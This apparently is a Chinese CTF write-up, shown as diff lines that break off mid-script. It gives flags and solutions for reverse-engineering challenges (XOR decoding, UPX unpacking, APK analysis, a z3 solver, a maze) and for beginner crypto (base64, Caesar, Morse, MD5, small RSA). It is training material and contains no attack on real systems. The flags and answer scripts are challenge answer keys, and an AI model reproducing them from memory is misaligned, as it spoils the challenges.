+<p>64位exe文件没壳 用IDA Pro打开</p>
+<p>分析程序时找到了flag</p>
+<p>也可以用 <code>Shift+F12</code> 直接找到</p>
+<h2 id="oceaner的仁慈">Oceaner的仁慈</h2>
+<p>flag:Redrock{DoYouReallyDoNotThinkREIsSimple???}</p>
+<p>32位exe文件没壳 用IDA Pro打开</p>
+<p>main函数</p>
+<pre><code class="language-c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int i; // eax
+  char ArgList[44]; // [esp+0h] [ebp-30h] BYREF
+
+  for ( i = 0; i &lt; 44; ++i )
+    ArgList[i] = byte_402110[4 * i] ^ 0xFA;
+  sub_401010(&quot;%s&quot;, (char)ArgList);
+  system(&quot;cls&quot;);
+  exit(0);
+}
+</code></pre>
+<p>用一个在地址<code>0x402110</code>处开始的数据来填充<code>ArgList</code>数组。每次循环增加4个字节，然后和<code>0xFA</code>进行异或（XOR）操作。</p>
+<p>读取地址<code>0x402110</code>到<code>004021BC</code>的数据</p>
+<pre><code>    0xA8, 0x9F, 0x9E, 0x88, 0x95, 0x99, 0x91, 0x81,
+    0xBE, 0x95, 0xA3, 0x95, 0x8F, 0xA8, 0x9F, 0x9B,
+    0x96, 0x96, 0x83, 0xBE, 0x95, 0xB4, 0x95, 0x8E,
+    0xAE, 0x92, 0x93, 0x94, 0x91, 0xA8, 0xBF, 0xB3,
+    0x89, 0xA9, 0x93, 0x97, 0x8A, 0x96, 0x9F, 0xC5,
+    0xC5, 0xC5, 0x87, 0xFA
+</code></pre>
+<p>写一个脚本解密</p>
+<pre><code class="language-python">encrypted_flag_bytes = [
+    0xA8, 0x9F, 0x9E, 0x88, 0x95, 0x99, 0x91, 0x81,
+    0xBE, 0x95, 0xA3, 0x95, 0x8F, 0xA8, 0x9F, 0x9B,
+    0x96, 0x96, 0x83, 0xBE, 0x95, 0xB4, 0x95, 0x8E,
+    0xAE, 0x92, 0x93, 0x94, 0x91, 0xA8, 0xBF, 0xB3,
+    0x89, 0xA9, 0x93, 0x97, 0x8A, 0x96, 0x9F, 0xC5,
+    0xC5, 0xC5, 0x87, 0xFA
+]
+flag = ''.join(chr(byte ^ 0xFA) for byte in encrypted_flag_bytes)
+print(flag)
+</code></pre>
+<h2 id="点击就送flag">点击就送flag</h2>
+<p>flag:redrock{y0u_c1icked_0n_me_haha}</p>
+<p>32位exe文件没壳 用IDA Pro打开</p>
+<p>查看main函数</p>
+<pre><code class="language-c++">Point = Msg.pt;
+      ScreenToClient(hWnd, &amp;Point);
+      if ( Point.x &gt;= X &amp;&amp; Point.x &lt;= X + 130 &amp;&amp; Point.y &gt;= Y &amp;&amp; Point.y &lt;= Y + 60 )
+      {
+        v19 = (HINSTANCE)(x + 1);
+        v15 = __PAIR64__(y, x) + 1;
+        y = (__PAIR64__(y, x) + 1) &gt;&gt; 32;
+        x = v15;
+        v20 = y;
+        if ( __PAIR64__(y, v15) &gt; 0x12C )
+        {
+          byte_416308 = 1;
+        }
+        else
+        {
+          v16 = rand() % 605;
+          v17 = rand() % 510;
+          SetWindowPos(dword_416720, 0, v16, v17, 0, 0, 5u);
+          v18 = rand();
+          SetWindowTextW(dword_416720, (&amp;lpString)[(v18 % 0x30) &gt;&gt; 2]);
+          X = v16;
+          y = v20;
+          Y = v17;
+          x = (LONG)v19;
+</code></pre>
+<p>可以知道这里是随机的，用于跳转那个按钮</p>
+<pre><code class="language-c++">        if ( __PAIR64__(y, v15) &gt; 0x12C )
+        {
+          byte_416308 = 1;
+        }
+</code></pre>
+<p>查找字符串，可以发现这里调用了一个txt文件</p>
+<p>跳到引用的地方</p>
+<pre><code class="language-c++">int __fastcall sub_401080(int a1, const void *a2)
+{
+  HANDLE FileA; // esi
+  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-8h] BYREF
+
+  FileA = CreateFileA(&quot;.\\click_me_flag.txt&quot;, 0xC0000000, 1u, 0, 2u, 0x80u, 0);
+  if ( FileA == (HANDLE)-1 )
+    return 0;
+  if ( !WriteFile(FileA, a2, strlen((const char *)a2), &amp;NumberOfBytesWritten, 0) )
+  {
+    CloseHandle(FileA);
+    return 0;
+  }
+  CloseHandle(FileA);
+  return 1;
+}
+</code></pre>
+<p>可以知道这个会将flag写入这个txt文件中</p>
+<p>进行动态调试断点，直接跳到需要的地方，让其写入flag</p>
+<pre><code class="language-c++">        SetWindowTextW(::hWnd, &amp;String);
+</code></pre>
+<pre><code>        sub_401110();
+</code></pre>
+<p>打开txt即为flag</p>
+<h2 id="easyre">EasyRE</h2>
+<p>flag:Redrock{w31c0m3_70_r3dr0ck}</p>
+<p>64位exe文件没壳 用IDA Pro打开</p>
+<p>没有找到什么东西</p>
+<p>经过一段分析</p>
+<p>大致就是要输入用户和密码，经过一系列的计算，要逆的就是用户名和密码</p>
+<p>如果输入正确，就会在登录的下面生成flag,由于输入的用户名密码是没有参与flag的生成的，因此可以动态调试，直接调到生成flag那里去</p>
+<h2 id="do_u_know_upx">Do_U_know_UPX</h2>
+<p>flag:Redrock{W6@t_15_UPX0.o}</p>
+<p>64位exe文件有壳 用x64打开手脱壳</p>
+<p>使用插件将数据dump出来</p>
+<p>分析dump的程序</p>
+<p>有许多混淆的代码，十分不好看，先找到比较函数，仔细分析可以发现</p>
+<p>对比函数这里对数据进行了操作</p>
+<p>结合动态调试</p>
+<p>输入的数据中途并没有进行运算，只是在最后进行了运算</p>
+<p>分析函数可以知道，这里实现了一个换表，然后异或，写代码逆向即可</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+int main()
+{
+    int j = 0;
+    char a[15] = &quot;Mhf*EsgEGVNvp5&quot;;
+    char arr[100] = &quot;~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)('&amp;&quot;;
+    int flag_num[20];
+    for (int i = 0; i &lt; 14; i++)
+    {
+        for ( j = 0; j &lt; 90; j++)
+        {
+            if(a[i] == arr[j])
+                break;
+        }
+        flag_num[i] = j;
+    }
+    for (int i = 0; i &lt; 14; i++)
+    {
+        flag_num[i] = (290 - (flag_num[i] ^ 0xFA));
+    }
+    
+    for (int i = 0; i &lt; 14; i++)
+    {
+        printf(&quot;%c&quot;, flag_num[i]);
+    }
+    
+    return 0;
+}
+//Redrock{W6@t_15_UPX0.o}
+</code></pre>
+<h2 id="do-you-like-jiaran">Do you like Jiaran?</h2>
+<p>flag:redrock{5ea76e34-c093-4b45-8dfe-47038a1900e1}</p>
+<p>apk文件 用jadx打开</p>
+<p>分析MainActivity函数</p>
+<pre><code class="language-java">package com.example.redrock;
+
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+import androidx.appcompat.app.AppCompatActivity;
+import java.security.MessageDigest;
+
+/* loaded from: classes3.dex */
+public class MainActivity extends AppCompatActivity {
+    Button btnlogin;
+    EditText name;
+    EditText passwd;
+    SharedPreferences sp1;
+    SharedPreferences sp2;
+
+    /* loaded from: classes3.dex */
+    public class a implements View.OnClickListener {
+        public a() {
+        }
+
+        @Override // android.view.View.OnClickListener
+        public void onClick(View view) {
+            new com.example.redrock.a();
+            new b();
+            String username = MainActivity.this.name.getText().toString();
+            String password = MainActivity.this.passwd.getText().toString();
+            try {
+                MainActivity.this.hello();
+                if (Compare.Compared(username, &quot;74fyx&quot;)) {
+                    MessageDigest md5 = MessageDigest.getInstance(&quot;MD5&quot;);
+                    byte[] psd = password.getBytes();
+                    byte[] MdPasswd = md5.digest(psd);
+                    StringBuilder stringBuilder = new StringBuilder();
+                    for (byte b : MdPasswd) {
+                        stringBuilder.append(String.format(&quot;%02x&quot;, Byte.valueOf(b)));
+                    }
+                    String RealPasswd = stringBuilder.toString();
+                    if (Compare.Compared(RealPasswd, &quot;4fef66a85d44d5db0cbb9531eb990a8c&quot;)) {
+                        MainActivity.this.name.setText(&quot;Good job! this is your flag: &quot; + com.example.redrock.a.b(b.a()));
+                    } else {
+                        Toast.makeText(MainActivity.this.getApplicationContext(), &quot;If you don't use frida then you are not a qualified Caramel candy and you will not get the flag you want!&quot;, 0).show();
+                    }
+                    return;
+                }
+                Toast.makeText(MainActivity.this.getApplicationContext(), username + &quot;All Caramel candies love Jadx, do you too?&quot;, 0).show();
+            } catch (Exception a2) {
+                a2.printStackTrace();
+            }
+        }
+    }
+
+    /* JADX INFO: Access modifiers changed from: protected */
+    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
+    public void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        this.name = (EditText) findViewById(R.id.name);
+        this.passwd = (EditText) findViewById(R.id.passwd);
+        this.btnlogin = (Button) findViewById(R.id.login);
+        this.sp1 = getSharedPreferences(&quot;userinfo&quot;, 0);
+        this.sp2 = getSharedPreferences(&quot;username&quot;, 0);
+        this.name.setText(this.sp1.getString(&quot;usname&quot;, null));
+        this.passwd.setText(this.sp1.getString(&quot;uspwd&quot;, null));
+        this.btnlogin.setOnClickListener(new a());
+    }
+
+    public void hello() {
+        System.out.println(&quot;Hello,World!&quot;);
+    }
+}
+</code></pre>
+<p>可以知道</p>
+<p>如果用户名和MD5加密后的密码都验证通过，那么flag将通过<code>com.example.redrock.a.b(b.a())</code>来获取。</p>
+<p>再分析a,b,c,d,e,f,g,h,i函数和compare函数，可以知道flag被RC4加密，密钥为<code>5ea76e34</code></p>
+<p>并且密文是按</p>
+<p><code>arrayList.get(8)</code> 从<code>b</code>类，值为<code>&quot;db97e0923f&quot;</code></p>
+<p><code>h.a()</code> 方法的返回值，值为 <code>&quot;5d1e0c3581&quot;</code></p>
+<p><code>i.a()</code> 方法的返回值，值为 <code>&quot;86cb88e423&quot;</code></p>
+<p><code>f.a()</code> 方法的返回值，值为 <code>&quot;1af6c887fc&quot;</code></p>
+<p><code>e.a()</code> 方法的返回值，值为 <code>&quot;8cc18426c8&quot;</code></p>
+<p><code>arrayList2.get(9)</code> 从<code>b</code>类，值为<code>&quot;de9c3afc5e&quot;</code></p>
+<p><code>c.a()</code> 方法的返回值，值为 <code>&quot;a27e88b0ea&quot;</code></p>
+<p><code>arrayList3.get(5)</code> 从<code>b</code>类，值为 `&quot;4b5dcc3626&quot;``</p>
+<p><code>d.a()</code> 方法的返回值，值为 <code>&quot;7d6b5eaced&quot;</code></p>
+<p>顺序连接 即密文为</p>
+<p><code>db97e0923f5d1e0c358186cb88e4231af6c887fc8cc18426c8de9c3afc5ea27e88b0ea4b5dcc36267d6b5eaced</code></p>
+<p>RC4解密即可</p>
+<h2 id="native-jvav">native jvav</h2>
+<p>flag:redrock{n@tive!nat1ve!nativ5!}</p>
+<p>用IDEA打开，将这个包载入</p>
+<p>这里可以看到java源码，分析源码可以知道，这里调用了dll文件中的<code>HelloJNI</code>函数</p>
+<p>将dll函数拖入ida中进行分析，分析逻辑即可得到flag</p>
+<h2 id="easypy">easypy</h2>
+<p>flag:redrock{<sub>@V@</sub>_We1come_7o_redr0ck}</p>
+<p>打开文件可以发现是py打包，用pyinstxtractor.py进行解包</p>
+<p>反编译<code>easy_python.pyc</code></p>
+<p>得到源码</p>
+<pre><code class="language-python">import sys
+
+def main():
+    print('Www……,ToT the flag has been lost. ')
+    print('I heard you are a wise warrior. Can you help me find it?')
+    v1 = input()
+    if len(v1) != 33 and v1[:8] != 'redrock{' or v1[32] != chr(125):
+        print(&quot;Emmm...,It seems wrong. You're looking in the wrong direction. Go back and take a look!&quot;)
+        sys.exit(1)
+    encrypt = encode(v1)
+    r1 = z3z(encrypt)
+    (a, b, c) = Xor_Or_Shift(encrypt[12:32])
+    if r1 and int(a) == 674851397 and int(b) == 1515869815 and int(c) == 1803516244:
+        print('Right!!!')
+        return None
+    None('Wrong!!!Please take a closer look!')
+
+
+def Option(o):
+    list = []
+    for i in range(len(o)):
+        list.append(ord(o[i]))
+    return list
+
+
+def z3z(n):
+    print(&quot;O.oO.oO.o————It's really hard to calculate!&quot;)
+    part1 = Option(n[:12])
+    if 138 * part1[0] + 204 * part1[1] + 874 * part1[2] + 387 * part1[3] + 713 * part1[4] + 833 * part1[5] + 974 * part1[6] + 999 * part1[7] + 128 * part1[8] + 698 * part1[9] + 790 * part1[10] + 469 * part1[11] == 626818 and 244 * part1[0] + 457 * part1[1] + 502 * part1[2] + 938 * part1[3] + 86 * part1[4] + 358 * part1[5] + 943 * part1[6] + 840 * part1[7] + 616 * part1[8] + 381 * part1[9] + 258 * part1[10] + 421 * part1[11] == 565019 and 361 * part1[0] + 472 * part1[1] + 773 * part1[2] + 220 * part1[3] + 794 * part1[4] + 237 * part1[5] + 762 * part1[6] + 676 * part1[7] + 595 * part1[8] + 623 * part1[9] + 328 * part1[10] + 198 * part1[11] == 523895 and 681 * part1[0] + 513 * part1[1] + 789 * part1[2] + 237 * part1[3] + 960 * part1[4] + 773 * part1[5] + 621 * part1[6] + 608 * part1[7] + 335 * part1[8] + 383 * part1[9] + 395 * part1[10] + 812 * part1[11] == 655241 and 503 * part1[0] + 702 * part1[1] + 628 * part1[2] + 150 * part1[3] + 672 * part1[4] + 324 * part1[5] + 795 * part1[6] + 892 * part1[7] + 738 * part1[8] + 610 * part1[9] + 150 * part1[10] + 862 * part1[11] == 643363 and 16 * part1[0] + 590 * part1[1] + 294 * part1[2] + 408 * part1[3] + 757 * part1[4] + 272 * part1[5] + 101 * part1[6] + 4 * part1[7] + 174 * part1[8] + 801 * part1[9] + 550 * part1[10] + 163 * part1[11] == 313208 and 956 * part1[0] + 720 * part1[1] + 177 * part1[2] + 741 * part1[3] + 579 * part1[4] + 5 * part1[5] + 863 * part1[6] + 135 * part1[7] + 571 * part1[8] + 451 * part1[9] + 935 * part1[10] + 762 * part1[11] == 618358 and 227 * part1[0] + 600 * part1[1] + 185 * part1[2] + 874 * part1[3] + 579 * part1[4] + 518 * part1[5] + 356 * part1[6] + 185 * part1[7] + 267 * part1[8] + 370 * part1[9] + 35 * part1[10] + 153 * part1[11] == 389914 and 173 * part1[0] + 641 * part1[1] + 83 * part1[2] + 826 * part1[3] + 218 * part1[4] + 845 * part1[5] + 282 * part1[6] + 893 * part1[7] + 578 * part1[8] + 29 * part1[9] + 636 * part1[10] + 746 * part1[11] == 555914 and 61 * part1[0] + 999 * part1[1] + 324 * part1[2] + 493 * part1[3] + 387 * part1[4] + 470 * part1[5] + 643 * part1[6] + 961 * part1[7] + 605 * part1[8] + 926 * part1[9] + 85 * part1[10] + 406 * part1[11] == 554902 and 857 * part1[0] + 823 * part1[1] + 648 * part1[2] + 45 * part1[3] + 949 * part1[4] + 230 * part1[5] + 763 * part1[6] + 810 * part1[7] + 603 * part1[8] + 707 * part1[9] + 809 * part1[10] + 88 * part1[11] == 628055 and 797 * part1[0] + 159 * part1[1] + 229 * part1[2] + 642 * part1[3] + 999 * part1[4] + 534 * part1[5] + 624 * part1[6] + 442 * part1[7] + 500 * part1[8] + 938 * part1[9] + 851 * part1[10] + 84 * part1[11] == 568919:
+        return True
+
+
+def Xor_Or_Shift(p):
+    part2 = Option(p)
+    k = 0
+    for i in range(len(part2) - 1):
+        part2[i] ^= part2[i + 1] ^ 102
+    res = []
+    for i in range(0, len(part2), 4):
+        k |= part2[i] &lt;&lt; 0
+        k |= part2[i + 1] &lt;&lt; ((i + 1) % 4) * 8
+        k |= part2[i + 2] &lt;&lt; ((i + 2) % 4) * 8
+        k |= part2[i + 3] &lt;&lt; ((i + 3) % 4) * 8
+        res.append(k)
+        k = 0
+    return res
+
+if __name__ == '__main__':
+    main()
+    return None
+
+</code></pre>
+<p>对数据进行了分割，一段是进行复杂的计算验证，一个进行合并异或</p>
+<p>复杂验证，z3脚本</p>
+<pre><code class="language-python">from z3 import *
+
+#数据
+#建立求解器
+s = Solver()  
+#设出flag     
+part1 = [BitVec('x%d' % i, 8) for i in range(12)]
+#对于flag进行限制，保证其为可见字符
+for i in range(12):
+    s.add(part1[i] &lt;= 127)
+    s.add(part1[i] &gt;= 32)
+# 中间添加程序的加密算法
+
+#约束条件
+s.add(138 * part1[0] + 204 * part1[1] + 874 * part1[2] + 387 * part1[3] + 713 * part1[4] + 833 * part1[5] + 974 * part1[6] + 999 * part1[7] + 128 * part1[8] + 698 * part1[9] + 790 * part1[10] + 469 * part1[11] == 626818)
+s.add(244 * part1[0] + 457 * part1[1] + 502 * part1[2] + 938 * part1[3] + 86 * part1[4] + 358 * part1[5] + 943 * part1[6] + 840 * part1[7] + 616 * part1[8] + 381 * part1[9] + 258 * part1[10] + 421 * part1[11] == 565019)
+s.add(361 * part1[0] + 472 * part1[1] + 773 * part1[2] + 220 * part1[3] + 794 * part1[4] + 237 * part1[5] + 762 * part1[6] + 676 * part1[7] + 595 * part1[8] + 623 * part1[9] + 328 * part1[10] + 198 * part1[11] == 523895)
+s.add(681 * part1[0] + 513 * part1[1] + 789 * part1[2] + 237 * part1[3] + 960 * part1[4] + 773 * part1[5] + 621 * part1[6] + 608 * part1[7] + 335 * part1[8] + 383 * part1[9] + 395 * part1[10] + 812 * part1[11] == 655241)
+s.add(503 * part1[0] + 702 * part1[1] + 628 * part1[2] + 150 * part1[3] + 672 * part1[4] + 324 * part1[5] + 795 * part1[6] + 892 * part1[7] + 738 * part1[8] + 610 * part1[9] + 150 * part1[10] + 862 * part1[11] == 643363)
+s.add(16 * part1[0] + 590 * part1[1] + 294 * part1[2] + 408 * part1[3] + 757 * part1[4] + 272 * part1[5] + 101 * part1[6] + 4 * part1[7] + 174 * part1[8] + 801 * part1[9] + 550 * part1[10] + 163 * part1[11] == 313208)
+s.add(956 * part1[0] + 720 * part1[1] + 177 * part1[2] + 741 * part1[3] + 579 * part1[4] + 5 * part1[5] + 863 * part1[6] + 135 * part1[7] + 571 * part1[8] + 451 * part1[9] + 935 * part1[10] + 762 * part1[11] == 618358)
+s.add(227 * part1[0] + 600 * part1[1] + 185 * part1[2] + 874 * part1[3] + 579 * part1[4] + 518 * part1[5] + 356 * part1[6] + 185 * part1[7] + 267 * part1[8] + 370 * part1[9] + 35 * part1[10] + 153 * part1[11] == 389914)
+s.add(173 * part1[0] + 641 * part1[1] + 83 * part1[2] + 826 * part1[3] + 218 * part1[4] + 845 * part1[5] + 282 * part1[6] + 893 * part1[7] + 578 * part1[8] + 29 * part1[9] + 636 * part1[10] + 746 * part1[11] == 555914)
+s.add(61 * part1[0] + 999 * part1[1] + 324 * part1[2] + 493 * part1[3] + 387 * part1[4] + 470 * part1[5] + 643 * part1[6] + 961 * part1[7] + 605 * part1[8] + 926 * part1[9] + 85 * part1[10] + 406 * part1[11] == 554902)
+s.add(857 * part1[0] + 823 * part1[1] + 648 * part1[2] + 45 * part1[3] + 949 * part1[4] + 230 * part1[5] + 763 * part1[6] + 810 * part1[7] + 603 * part1[8] + 707 * part1[9] + 809 * part1[10] + 88 * part1[11] == 628055)
+s.add(797 * part1[0] + 159 * part1[1] + 229 * part1[2] + 642 * part1[3] + 999 * part1[4] + 534 * part1[5] + 624 * part1[6] + 442 * part1[7] + 500 * part1[8] + 938 * part1[9] + 851 * part1[10] + 84 * part1[11] == 568919)
+
+
+
+#得出解，将解按顺序以我们需要的形式打印出来
+if s.check() == sat:
+    model = s.model()
+    string = [chr(model[part1[i]].as_long().real) for i in range(12)]
+    print(&quot;&quot;.join(string))
+#无解
+else:
+    print('无')
+</code></pre>
+<p>~Wee@e_dV17r</p>
+<p>异或合并，脚本逆向</p>
+<pre><code class="language-python">def Reverse_Option(int_list):
+    original_string = ''.join(chr(x) for x in int_list)
+    return original_string
+
+def Reverse_Xor_Or_Shift(encrypted_data):
+    part2 = []
+    for k in encrypted_data:
+        part2.extend([
+            (k &gt;&gt; 0) &amp; 0xFF,
+            (k &gt;&gt; 8) &amp; 0xFF,
+            (k &gt;&gt; 16) &amp; 0xFF,
+            (k &gt;&gt; 24) &amp; 0xFF
+        ])
+    for i in range(len(part2) - 2, -1, -1):
+        part2[i] ^= part2[i + 1] ^ 102
+    original_data = Reverse_Option(part2)
+
+    return original_data
+
+
+# 假设 encrypted_data 是从 encrypt[12:32] 中获得的整数列表
+encrypted_data = [674851397, 1515869815, 1803516244]
+original_data = Reverse_Xor_Or_Shift(encrypted_data)
+
+print(original_data)
+</code></pre>
+<p>@co0~o_c_mrk</p>
+<p><sub>Wee@e_dV17r@co0</sub>o_c_mrk</p>
+<p>最后是栅栏密码解密</p>
+<h2 id="strangebroadcast">StrangeBroadcast</h2>
+<p>flag:redrock{010716129f9491db45e842a6562410a2901}</p>
+<p>关于广播，就是相当于系统发一段通知，然后所有程序收到对应信号之后，对于特定的标识进行特定的反应</p>
+<p>对于广播的触发点，一般写广播都会重写**<code>onReceive</code>，因此直接搜索这个函数**</p>
+<p>可以找到逻辑，需要输入一个用户名，然后进行哈希验证，成功就打印flag</p>
+<p>因此在use这个变量名后面需要接入用户名</p>
+<p>对于创建一个广播，还需要知道类型。</p>
+<p>创建一个广播之后可以知道一般会写一个**<code>onCreate</code> 函数来进行声明**</p>
+<p>这里就找到了广播类型</p>
+<p>接下来，手机连接之后，在adb中输入刚刚得到的信息，然后发送广播</p>
+<p><code>adb shell am broadcast -a com.examp1e.oc4an -e user &quot;admin”</code></p>
+<p>发送广播之后，查看手机</p>
+<h2 id="tiger">Tiger</h2>
+<p>flag:Redrock{I_am_Tiger_Who_are_you}</p>
+<p>64位exe 用IDA Pro打开</p>
+<p>经过分析，是一道迷宫题</p>
+<p><code>unk_7ff706BA3520</code>是迷宫的地图,可以动态调试将其提取出来</p>
+<p><code>12*12</code>的棋盘 墙面为<code>O</code>终点为<code>0x16,</code>起点为<code>0x01</code></p>
+<p>用脚本提取出迷宫</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+int main()
+{
+
+char map[144] = {0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x01, 
+    0x06, 0x06, 0x06, 0x06, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 
+    0x4F, 0x06, 0x06, 0x4F, 0x4F, 0x4F, 0x06, 0x06, 0x06, 0x06, 0x06, 0x06, 0x06, 0x06, 0x4F, 0x4F, 
+    0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x06, 0x4F, 0x06, 0x06, 0x4F, 0x4F, 0x4F, 0x06, 0x4F, 
+    0x4F, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x06, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x06, 
+    0x4F, 0x06, 0x06, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x06, 0x06, 0x4F, 0x06, 0x4F, 0x4F, 
+    0x4F, 0x06, 0x06, 0x06, 0x06, 0x4F, 0x16, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 
+    0x06, 0x4F, 0x06, 0x4F, 0x4F, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x06, 0x06, 0x06, 0x06, 
+    0x06, 0x06, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F};
+     int num = 0;
+     for (int i = 0; i &lt; 144; i++)
+     {
+         
+         printf(&quot;%02x &quot;, map[i]);
+         num++;
+         if (num == 12)
+         {
+             printf(&quot;\n&quot;);
+             num = 0;
+         }
+            
+    }
+return 0;
+}
+</code></pre>
+<p>地图如下</p>
+<pre><code>4f 4f 4f 4f 4f 4f 4f 4f 4f 4f 4f 4f
+4f 4f 4f 01 06 06 06 06 4f 4f 06 4f
+4f 4f 4f 4f 4f 06 4f 4f 4f 06 06 4f
+4f 4f 06 06 06 06 06 06 06 06 4f 4f
+4f 4f 06 4f 4f 4f 4f 06 4f 06 06 4f
+4f 4f 06 4f 4f 4f 4f 06 4f 4f 06 4f
+4f 06 06 4f 4f 4f 4f 06 4f 06 06 4f
+4f 06 4f 4f 4f 4f 06 06 4f 06 4f 4f
+4f 06 06 06 06 4f 16 4f 4f 06 4f 4f
+4f 4f 4f 4f 06 4f 06 4f 4f 06 4f 4f
+4f 4f 4f 4f 06 06 06 06 06 06 4f 4f
+4f 4f 4f 4f 4f 4f 4f 4f 4f 4f 4f 4f
+</code></pre>
+<p>用wasd走迷宫 <code>ddssddddsdssassssaaaww</code></p>
+<p>分析可以发现步数是加密了的,因此将wasd转化为对应的方向,然后再以此为密文,进行解密</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+int main()
+{
+char arr[30] = {0x2D, 0x3A, 0x14, 0x1B, 0x37, 0x3D, 0x03, 0x0C, 0x1E, 0x1F, 0x22, 0x29, 0x05, 0xEF, 0xDE, 0xE3,
+                    0xF1, 0x17, 0x2C, 0x0D, 0xE4, 0xF9, 0x38, 0x43, 0x89, 0x62, 0xCD, 0x0C, 0x07, 0x7A, 0x2B, 0x63};
+
+    char a[24] = {&quot;ddssddddsdssassssaaaww&quot;};
+    char a2[24];
+    for (int i = 0; i &lt; 22; i++)
+    {
+        switch (a[i])
+        {
+        case 'w':
+             a2[i] = 141;
+             break;
+        case 'a':
+             a2[i] = 155;
+             break;
+        case 's':
+             a2[i] = 137;
+             break;
+        case 'd':
+             a2[i] = 158;
+             break;
+        }
+    }
+    char flag[23];
+    for (int i = 0; i &lt; 22; i++)
+    {
+        flag[i] = ((a2[i] ^ 0xfa) + i) ^ arr[i];
+    }
+    for (int i = 0; i &lt; 22; i++)
+    {
+        printf(&quot;%c&quot;, flag[i]);
+    }
+
+return 0;
+}
+</code></pre>
+<p>得到flag</p>
+<h1 id="crypto"><strong>CRYPTO</strong></h1>
+<h2 id="easy_base">easy_base</h2>
+<p>flag:0xFA{tHis_iS_ba5e64_enCodinG}</p>
+<p>base64解密</p>
+<p>密文</p>
+<p><code>QmFzZTY0IGlzIGEgZ3JvdXAgb2YgYmluYXJ5LXRvLXRleHQgZW5jb2Rpbmcgc2NoZW1lcyB0aGF0IHJlcHJlc2VudCBiaW5hcnkgZGF0YS4gQW5kIGZsYWcgaXMgMHhGQXt0SGlzX2lTX2JhNWU2NF9lbkNvZGluR30=</code></p>
+<p>原文</p>
+<p><code>Base64 is a group of binary-to-text encoding schemes that represent binary data. And flag is 0xFA{tHis_iS_ba5e64_enCodinG}</code></p>
+<h2 id="easy_caesar">easy_caesar</h2>
+<p>flag:0xFA{venividivici}</p>
+<p>凯撒解密 偏移量为<code>3</code></p>
+<p>密文</p>
+<p><code>qrzbrxnqrzfdhvduflskhudqgiodjlvyhqlylglylfl</code></p>
+<p>原文</p>
+<p><code>nowyouknowcaesarcipherandflagisvenividivici</code></p>
+<h2 id="easy_morse">easy_morse</h2>
+<p>flag:0xFA{EA5Y1M0R5E1C0DE}</p>
+<p>摩斯解密</p>
+<p>密文</p>
+<p><code>./.-/...../-.--/.----/--/-----/.-./....././.----/-.-./-----/-.././</code></p>
+<p>原文</p>
+<p><code>EA5Y1M0R5E1C0DE</code></p>
+<h2 id="easy_passwd">easy_passwd</h2>
+<p>flag:0xFA{adminadmin}</p>
+<p>md5解密</p>
+<p>密文</p>
+<p><code>f6fdffe48c908deb0f4c3bd36c032e72</code></p>
+<p>原文</p>
+<p><code>adminadmin</code></p>
+<h2 id="easy_rsa">easy_rsa</h2>
+<p>flag:0xFA{F4ct0r_Pr1me}</p>
+<p><code>n = 412185872968401257793868364974500949106246851673 e = 65537 cipher = 238402953668524899208063558207075404357269541120</code></p>
+<p>在线网站将n分解</p>
+<p><code>611687078420145662043749</code></p>
+<p><code>673850874916284786767077</code></p>
+<p>脚本解密</p>
+<pre><code class="language-python">from sympy import mod_inverse
+
+# 给定的两个大素数p和q
+p = 611687078420145662043749
+q = 673850874916284786767077
+
+# 给定的公钥指数e和密文cipher
+e = 65537
+cipher = 238402953668524899208063558207075404357269541120
+
+# 计算n，n是p和q的乘积
+n = p * q
+
+# 计算phi(n)，即n的欧拉函数值
+phi_n = (p - 1) * (q - 1)
+
+# 计算私钥指数d，d是e关于phi(n)的模逆元
+d = mod_inverse(e, phi_n)
+
+# 使用私钥指数d来解密密文
+# 使用pow函数进行快速幂模运算，避免直接计算过大的数字
+plain = pow(cipher, d, n)
+
+# 打印结果
+print(f&quot;公钥(n, e): ({n}, {e})&quot;)
+print(f&quot;私钥指数d: {d}&quot;)
+print(f&quot;解密后的明文: {plain}&quot;)
+
+</code></pre>
+<p>明文解密</p>
+<pre><code class="language-python">def int_to_bytes(n):
+    # 将整数转换为字节序列
+    return n.to_bytes((n.bit_length() + 7) // 8, 'big')
+
+def bytes_to_string(b):
+    # 将字节序列转换为字符串
+    try:
+        return b.decode()
+    except UnicodeDecodeError:
+        # 如果无法直接解码，可能是因为存在非法的字节序列
+        return &quot;不能解码为字符串&quot;
+
+# 给定的明文整数
+plain_int = 4222316994714303769606460264681494360712573
+
+# 将整数转换为字节序列
+plain_bytes = int_to_bytes(plain_int)
+
+# 将字节序列转换为字符串
+plain_str = bytes_to_string(plain_bytes)
+
+print(plain_str)
+</code></pre>
+<h2 id="easy_wfa">easy_wfa</h2>
+<p>flag:0xFA{welcome_to_oxfa}</p>
+<p>单表加密法，需要分析字母频率</p>
+<pre><code class="language-python">from collections import Counter
+
+# 替换这里的文本为你的密文
+ciphertext = &quot;&quot;&quot;
+lkq pghiley veyyqh eom lkq nyea xi sqypfjq lf fzne 
+
